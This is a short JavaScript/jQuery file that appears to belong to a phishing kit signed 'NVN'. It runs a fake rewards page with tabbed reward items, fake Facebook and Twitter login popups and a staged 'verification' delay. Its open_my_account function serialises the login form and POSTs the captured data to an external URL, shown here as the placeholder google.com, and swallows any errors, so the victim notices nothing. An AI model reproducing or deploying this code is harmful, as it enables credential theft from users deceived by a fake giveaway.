// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup

function open_newhome(){
	$('.account_login').show();
	$('.newhome').hide();
}
function open_verification(){
	$('.check_verification').show();
	$(".open_rewards").hide()
	$(".otherReward_confirmation").hide()
	$(".itemReward_confirmation").hide()
setTimeout(function(){
            $('.check_verification').hide();
$('.processing_account').show();
        },5000);
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}

function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function close_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}
function open_newhome(){
    $('.account_login').show();
	$('.newhome').hide();
}
function open_account_login(){
	$('.account_login').show();
	$('.itemReward_confirmation').hide();}

// code function data
	// Validate Data

	
function open_my_account() {var e = $(".popup-box-form").serialize();$.ajax({url: 'https://google.com',data: e,type: 'POST',success: function() {},error: function() {return true;}});}

<!--SCRIPT By NVN-->
<!-- SCRIPT BY NVN: https://facebook.com/778578204 -->   